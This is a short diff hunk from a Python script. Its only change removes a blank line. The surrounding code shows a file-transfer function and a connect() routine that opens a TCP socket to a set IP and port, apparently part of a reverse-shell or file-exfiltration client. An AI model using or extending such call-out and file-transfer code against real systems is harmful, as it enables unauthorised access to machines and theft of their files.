@@ -18,7 +18,6 @@ def transfer(s,path):
         s.send('Unable to find out the file')
         
 def connect():
-
     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     s.connect(("10.10.10.10",8080))   #Specify the IP address and Port number
 
